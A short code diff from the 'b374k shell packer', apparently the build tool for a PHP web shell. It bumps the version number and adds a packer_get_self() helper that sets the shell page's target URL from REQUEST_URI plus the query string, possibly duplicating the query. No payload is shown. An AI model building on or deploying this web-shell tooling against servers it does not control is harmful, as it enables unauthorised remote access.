@@ -7,7 +7,7 @@
 
 */
 $GLOBALS['packer']['title'] = "b374k shell packer";
-$GLOBALS['packer']['version'] = "0.2";
+$GLOBALS['packer']['version'] = "0.3";
 $GLOBALS['packer']['base_dir'] = "./base/";
 $GLOBALS['packer']['module_dir'] = "./module/";
 $GLOBALS['packer']['theme_dir'] = "./theme/";
@@ -199,7 +199,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 	<?php echo $zepto_code;?>
 	<?php echo $js_main_code;?>
 
-	var targeturl = '<?php echo $_SERVER["REQUEST_URI"];?>';
+	var targeturl = '<?php echo packer_get_self(); ?>';
 	var debug = false;
 
 	Zepto(function($){
@@ -417,6 +417,11 @@ function packer_output($str){
 	header("Pragma: no-cache");
 	echo $str;
 	die();
+}
+
+function packer_get_self(){
+	$query = (isset($_SERVER["QUERY_STRING"])&&(!empty($_SERVER["QUERY_STRING"])))?"?".$_SERVER["QUERY_STRING"]:"";
+	return $_SERVER["REQUEST_URI"].$query;
 }
 
 function packer_strips($str){
